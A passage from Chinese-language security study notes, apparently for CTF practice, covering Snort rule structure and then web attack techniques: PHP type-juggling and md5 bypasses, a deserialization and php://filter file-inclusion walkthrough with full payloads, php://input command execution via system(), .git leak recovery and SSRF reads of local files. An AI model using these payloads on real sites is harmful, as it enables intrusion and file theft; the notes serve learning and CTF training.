Snort结构</h4><p>Snort主要包括四个模块：数据包嗅探器、预处理器、检测引擎和报警输出模块。</p><ol><li>数据包嗅探器模块</li></ol><p>主要用来实现网络数据包捕获和解析的功能。将捕获的网络数据包按照TCP/IP协议族的不同层次进行解析。</p><ol><li>预处理器模块</li></ol><p>针对可疑行为检查包或者修改包以便检测引擎能对其正确解释，还可以对网络流进行标准化，以便检测引擎能够准确匹配特征。</p><ol><li>检测引擎模块</li></ol><p>检测引擎模块是入侵检测系统实现的核心，当数据包从预处理器送过来后，检测引擎依据预先设置的规则检查数据包，一旦发现数据包中的内容和某条规则相匹配，就通知报警模块。</p><ol><li>报警/日志输出模块</li></ol><p>检测引擎检查后的Snort数据需要以某种方式输出。</p><h4 id="13-3-6-3-Snort规则结构"><a href="#13-3-6-3-Snort规则结构" class="headerlink" title="13.3.6.3 Snort规则结构"></a>13.3.6.3 Snort规则结构</h4><p>Snort采用基于规则的网络入侵模式搜索机制，对网络数据包进行模式匹配，从中发现入侵或恶意攻击行为。</p><p>Snort将所有已知的入侵行为以规则的形式存放在规则库中，每一条规则由规则头和规则选项两个部分组成。</p><p>规则头定义了规则的动作、所匹配网络报文的协议、源地址、目的地址、源端口及目标端口等信息；规则选项部分则包含了所要显示给用户查看的警告信息以及用来判定报文是否为攻击报文的其他信息。</p><p>Snort规则头部的主要结构如下所示。</p><ul><li>动作：当规则与包比对并符合条件时，会采取什么类型的动作。出现通常动作时产生报警或记录日志或向其他规则发出请求。</li><li>协议：用来在一个特定协议的包上应用规则。</li><li>地址：定义源或目的地址</li><li>端口：如果协议是TCP或UDP，端口部分用来确定规则所对应的包的源及目的端口。</li><li>方向：确定哪一边的地址和端口是源，哪一边是目的。</li></ul><p>例如，下述规则在探测到TTL为100的ICMP ping包时，就会产生报警：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert icmp any any -&gt; any any (msg: &quot;Ping with TTL=100&quot;; ttl: 100;)</span><br></pre></td></tr></table></figure><p>括号之前的部分叫做规则头部，括号中的部分叫做规则选项。头部依次包括下面部分：</p><ol><li>规则的动作：在这个规则中，动作是alert（报警），就是如果符合下面的条件，就会产生一个报警。如果产生报警，默认的情况下将会记录日志。</li><li>协议：在这个规则中，协议是ICMP，也就是说这条规则仅仅对ICMP包有效，如果一个包的协议不是ICMP， Snort探测引擎就不理会这个包以节省CPU时间。</li><li>源地址和源端口：在这个例子中，它们都被设置成了any，也就是这条规则将被应用在来自任何地方的ICMP包上，当然，端口号与ICMP是没有什么关系的，仅仅和TCP和UDP有关系。</li><li>方向：用→表示从左向右的方向，表示在这个符号的左面部分是源，右面是目的，也表示规则应用在从源到目的的包上。如果是←，那么就相反。注意，也可以用&lt;&gt;来表示规则将应用在所有方向上。</li><li>目的地址和端口：若都是any，则表示规则并不关心它们的目的地址。在这个规则中，由于any的作用，方向段并没有实际的作用，因为它将被应用在所有方向的ICMP包上。</li><li>在括号中的选项部分表示：如果包符合TTL=100的条件就产生一条包含文字“Ping with TTL=100”的报警。TTL是IP数据包头部字段。</li></ol><h4 id="13-3-6-4-Snort典型规则示例"><a href="#13-3-6-4-Snort典型规则示例" class="headerlink" title="13.3.6.4 Snort典型规则示例"></a>13.3.6.4 Snort典型规则示例</h4><p>Snort规则的本质就是简单模式匹配，即通过对数据包的分析得到所需信息，用以匹配自身的规则库。</p><p>在初始化并解析规则时，分别生成四个不同的规则树：TCP、UDP、ICMP和IP，每一个规则树即一个独立的三维链表：规则头（Rule Tree Node，RTN）、规则选项（Optional Tree Node，OTN）和指向匹配函数的指针。</p><p>Snort初始化时，会根据配置文件的要求加载相应的规则。Snort对每条规则进行三次分类：协议分类、源/目标端口分类、内容类别分类。 </p><h2 id="13-4-R：响应技术"><a href="#13-4-R：响应技术" class="headerlink" title="13.4 R：响应技术"></a>13.4 R：响应技术</h2><ul><li><p>计算机及网络取证技术</p><p>–分析攻击并寻找追溯线索</p><p>–保全并提取现场证据：法律执行部门</p></li><li><p>攻击追溯和响应</p><p>–Attacker Trace: very difficult, Step-stone attack</p><p>–以牙还牙, 以暴制暴? –并不可取</p></li><li><p>备份恢复</p><p>–建立良好的关键数据备份习惯</p><p>–RAID冗余磁盘阵列-&gt;冷备份-&gt;双机热备（保持业务连续性）</p></li><li><p>灾难恢复</p><p>–重要性数据的异地容灾备份：2/5的公司经历大灾难后再也不能恢复运作</p></li></ul><h1 id="14-HTTP"><a href="#14-HTTP" class="headerlink" title="14. HTTP"></a>14. HTTP</h1><h2 id="14-1-抓包关键点"><a href="#14-1-抓包关键点" class="headerlink" title="14.1 抓包关键点"></a>14.1 抓包关键点</h2><p><strong>Referer</strong></p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器该网页是从哪个页面链接过来的，服务器因此可以获得一些信息用于处理。Referer 常用在防盗链和防恶意请求中。传输referer需要在页面内添加相关的代码。</p><p><strong>User-Agent</strong></p><p>用来传输用户使用的是什么样的浏览器。有些网站为了防止爬虫，会检验User-Agent，只有当是用户访问的时候才会传输数据。</p><p><strong>X-Forwarded-For</strong></p><p>X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。当今多数缓存服务器的用户为大型ISP，为了通过缓存的方式来降低他们的外部带宽，他们常常通过鼓励或强制用户使用代理服务器来接入互联网。有些情况下，这些代理服务器是透明代理，用户甚至不知道自己正在使用代理上网。<br>如果没有XFF或者另外一种相似的技术，所有通过代理服务器的连接只会显示代理服务器的IP地址，而非连接发起的原始IP地址，这样的代理服务器实际上充当了匿名服务提供者的角色，如果连接的原始IP地址不可得，恶意访问的检测与预防的难度将大大增加。<br>如果你使用透明代理上网，那么在透明代理发送给服务器端的HTTP请求中会包含x-forward-for信息<br>简单来说就是用来传输最原始ip地址的,阻止匿名请求的，但是可以通过抓包来修改。</p><p>小常识：网站的目录一般都在/var/www/html/</p><h2 id="14-2-Tornado框架"><a href="#14-2-Tornado框架" class="headerlink" title="14.2 Tornado框架"></a>14.2 Tornado框架</h2><p>Tornado框架的附属文件handler.settings中存在cookie_secret</p><p>尝试：error?msg= </p><h2 id="14-3-备份文件"><a href="#14-3-备份文件" class="headerlink" title="14.3 备份文件"></a>14.3 备份文件</h2><p>备份文件常用的后缀：.rar    .zip    .7z    .tar.gz    .bak    .swp    .txt    .html</p><h3 id="14-3-1-vim缓存"><a href="#14-3-1-vim缓存" class="headerlink" title="14.3.1 vim缓存"></a>14.3.1 vim缓存</h3><p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p><p>以 index.php 为例：第一次产生的交换文件名为 <code>.index.php.swp</code></p><p>再次意外退出后，将会产生名为 <code>.index.php.swo</code> 的交换文件</p><p>第三次产生的交换文件则为 <code>.index.php.swn</code></p><h3 id="14-3-2-DS-Store文件利用"><a href="#14-3-2-DS-Store文件利用" class="headerlink" title="14.3.2 .DS_Store文件利用"></a>14.3.2 .DS_Store文件利用</h3><p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。 (直接在URL里加上<code>/.DS_Store</code>)</p><p>记事本打开查找文件，放在URL上。</p><h2 id="14-4-弱类型绕过"><a href="#14-4-弱类型绕过" class="headerlink" title="14.4 弱类型绕过"></a>14.4 弱类型绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">==只要值相等</span><br><span class="line">===不仅值相等还要数据类型相同</span><br></pre></td></tr></table></figure><p>例1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload:/?key=123</span></span><br></pre></td></tr></table></figure><p>例2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload:/?password=404a</span></span><br></pre></td></tr></table></figure><p>例3：md5绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;window.location.replace(&#x27;./levell14.php&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>（1）找出md5值都是两个0e开头的开头的。原理是php里面在做 == 的时候会先把两边的类型转成一样的，因为是0e开头，php会认为它是科学技计数法，而0的多少次方都是0。举例：QNKCDZO、s155964671a、s1091221200a。</p><p>（2）数组绕过。原理是md5等函数不能处理数组，导致函数返回Null。而Null是等于Null的，导致了绕过。 举例：a[]=1&amp;b[]=2。做===的时候只能用数组绕过。</p><h2 id="14-5-序列号与反序列化"><a href="#14-5-序列号与反序列化" class="headerlink" title="14.5 序列号与反序列化"></a>14.5 序列号与反序列化</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">serialize</span>()序列化</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>()反序列化</span><br><span class="line"></span><br><span class="line">O:<span class="title function_ invoke__">strlen</span>(<span class="keyword">object</span> name):<span class="keyword">object</span> name:<span class="keyword">object</span> size:&#123;s:<span class="title function_ invoke__">strlen</span>(property name):property name:property definition;(repeated per property)&#125;</span><br><span class="line"></span><br><span class="line">O:<span class="number">4</span>:“Flag”:<span class="number">1</span>:&#123;s:<span class="number">4</span>:“file”;s:<span class="number">8</span>:“flag.php”;&#125;</span><br></pre></td></tr></table></figure><h2 id="14-6-伪协议"><a href="#14-6-伪协议" class="headerlink" title="14.6 伪协议"></a>14.6 伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php://filter用于读取源码</span><br><span class="line">用法：php://filter/read=convert.base64-encode/resource=xxx</span><br><span class="line"></span><br><span class="line">php://input用于执行php代码，需要POST请求提交数据</span><br><span class="line"></span><br><span class="line">data://text/plain用于数据流的读取，如果传入的数据是php代码，就会执行代码</span><br><span class="line">用法：data://text/plain;base64,xxxx(base64编码后的数据)</span><br><span class="line"></span><br><span class="line">file://用于访问本地文件系统</span><br><span class="line">用法：file://[文件的绝对路径]</span><br></pre></td></tr></table></figure><h3 id="14-6-1-data-text-plain"><a href="#14-6-1-data-text-plain" class="headerlink" title="14.6.1 data://text/plain"></a>14.6.1 data://text/plain</h3><p>条件</p><p>allow_url_fopen: on</p><p>allow_url_include: on</p><p>例：[ZJCTF 2019]NiZhuanSiWei 1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>要从URL中输入参数text,file和password。</p><p>data://text/plain用于数据流的读取，我们用data伪协议读出text里的内容。 一般为了绕过某些过滤都会用到base64，这里没有过滤所以可以不用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain,welcome to the zjctf</span><br><span class="line">data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure><p>preg_match()是执行匹配正则表达式，只要文件中有出现flag字眼，都会被过滤。此php文件还包含另一个php文件useless.php，利用php://filter来进行读取php文件，而不能直接用file=useless.php读取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain,welcome to the zjctf&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure><p>读取后会出现类似于乱码的东西，但其实那是base64编码，拿去解码，解出下面代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>这里提示我们有个flag.php文件，我们直接就将变量file等于这个文件，构造一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&#x27;flag.php&#x27;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">//O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>这里有个问题是为什么要序列化输出变量a呢，可能是因为在存password之前把password反序列化了，即我们存进去的密码不是我们输入的密码，而是将密码反序列化后的一串东西。所以我们要得到我们输入的密码就必须将存进去的密码序列化回来。</p><p>完整payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?text=data://text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</span><br></pre></td></tr></table></figure><h3 id="14-6-2-php-input"><a href="#14-6-2-php-input" class="headerlink" title="14.6.2 php://input"></a>14.6.2 php://input</h3><p>php://input要求<code>allow_url_include</code>设置为<code>On</code>，所以得看看phpinfo()中的<code>allow_url_include</code>是否为<code>On</code>。</p><p>然后用burpsuite抓包，发送到repeater里去，将第一行设置为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?file=php://input HTTP/1.1</span><br></pre></td></tr></table></figure><p>在最下面设置为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#&lt;?php system(&quot;ls /&quot;); ?&gt;send,返回目录</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /falg_19485&quot;</span>);<span class="meta">?&gt;</span>send,返回flag</span><br></pre></td></tr></table></figure><h3 id="14-6-3-php-filter"><a href="#14-6-3-php-filter" class="headerlink" title="14.6.3 php://filter"></a>14.6.3 php://filter</h3><p>参考如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://writeup.ctfhub.com/Skill/Web/RCE/366Ttyc8tGBiCyo54pR8YR.html</span><br></pre></td></tr></table></figure><h2 id="14-7-请求方式"><a href="#14-7-请求方式" class="headerlink" title="14.7 请求方式"></a>14.7 请求方式</h2><p>请求方式可以自定义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php HTTP/1.1</span><br><span class="line">CTFHUB /index.php HTTP/1.1</span><br></pre></td></tr></table></figure><h2 id="14-8-302跳转"><a href="#14-8-302跳转" class="headerlink" title="14.8 302跳转"></a>14.8 302跳转</h2><p>302跳转将包发送到repeater模块查看响应包，因为在HTTP history模块里好像看不到响应包。</p><p>查看源代码链接指向index.php，然而在URL上看跳转到了index.html，所以发生了302跳转。</p><h2 id="14-9-Cookie"><a href="#14-9-Cookie" class="headerlink" title="14.9 Cookie"></a>14.9 Cookie</h2><p>cookie伪造，欺骗。直接在cookie管理器里修改。比如admin=0改为admin=1</p><h2 id="14-10-基本认证"><a href="#14-10-基本认证" class="headerlink" title="14.10 基本认证"></a>14.10 基本认证</h2><p>在HTTP中对于基础认证的一些知识，要求使用爆破的方法来获得基础认证的账号密码，之后登陆获得flag。</p><p>如何在burpsuite构造payload：</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html">https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html</a></p><h1 id="15-信息泄露"><a href="#15-信息泄露" class="headerlink" title="15. 信息泄露"></a>15. 信息泄露</h1><h2 id="15-1-Git泄露"><a href="#15-1-Git泄露" class="headerlink" title="15.1 Git泄露"></a>15.1 Git泄露</h2><p>当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。 </p><h3 id="15-1-1-Log"><a href="#15-1-1-Log" class="headerlink" title="15.1.1 Log"></a>15.1.1 Log</h3><p>Githack：.git泄露利用工具，可还原历史版本。</p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GitHack.py http://www.example.com/.git/</span><br></pre></td></tr></table></figure><h3 id="15-1-2-Stash"><a href="#15-1-2-Stash" class="headerlink" title="15.1.2 Stash"></a>15.1.2 Stash</h3><h3 id="15-1-3-Index"><a href="#15-1-3-Index" class="headerlink" title="15.1.3 Index"></a>15.1.3 Index</h3><h2 id="15-2-SVN泄露"><a href="#15-2-SVN泄露" class="headerlink" title="15.2 SVN泄露"></a>15.2 SVN泄露</h2><h2 id="15-3-HG泄露"><a href="#15-3-HG泄露" class="headerlink" title="15.3 HG泄露"></a>15.3 HG泄露</h2><h1 id="16-服务端请求伪造-SSRF"><a href="#16-服务端请求伪造-SSRF" class="headerlink" title="16. 服务端请求伪造(SSRF)"></a>16. 服务端请求伪造(SSRF)</h1><h2 id="16-1-内网访问"><a href="#16-1-内网访问" class="headerlink" title="16.1 内网访问"></a>16.1 内网访问</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/?url=127.0.0.1/flag.php</span><br></pre></td></tr></table></figure><p>小知识点，file://可以查看源码，前提要知道路径。这也是表示有SSRF漏洞的关键点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///var/www/html/flag.php</span><br></pre></td></tr></table></figure><h2 id="16-2-伪协议读取文件"><a href="#16-2-伪协议读取文件" class="headerlink" title="16.2 伪协议读取文件"></a>16.2 伪协议读取文件</h2><p>了解伪协议：<a href="https://www.cnblogs.com/-mo-/p/11673190.html">https://www.cnblogs.com/-mo-/p/11673190.html</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file:// – 本地文件传输协议，主要用于访问本地计算机中的文件。</span><br><span class="line"></span><br><span class="line">dict:// – 字典服务器协议，dict是基于查询相应的TCP协议。</span><br><span class="line"></span><br><span class="line">sftp:// – SSH文件传输协议或安全文件传输协议（Secure File Transfer Protocol）是一种简单的基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机。</span><br><span class="line"></span><br><span class="line">ldap:// – 代表轻量级目录访问协议。它是IP网络上的一种用于管理和访问分布式目录信息服务的应用程序协议。</span><br><span class="line"></span><br><span class="line">tftp:// – 基于lockstep机制的文件传输协议，允许客户端从远程主机获取文件或将文件上传至远程主机。</span><br><span class="line"></span><br><span class="line">gopher:// – 是一种分布式文档传递服务。利用该服务，用户可以无缝地浏览、搜索和检索驻留在不同位置的信息。</span><br></pre></td></tr></table></figure><h2 id="16-3-端口扫描"><a href="#16-3-端口扫描" class="headerlink" title="16.3 端口扫描"></a>16.3 端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/?url=127.0.0.1:8000</span><br><span class="line">题目会给端口号范围，用burpsuite爆破端口号</span><br></pre></td></tr></table></figure><h2 id="16-4-POST请求"><a href="#16-4-POST请求" class="headerlink" title="16.4 POST请求"></a>16.4 POST请求</h2><blockquote><p>这次是发一个HTTP POST请求.对了.ssrf是用php的curl实现的.并且会跟踪302跳转.加油吧骚年 </p><p><a 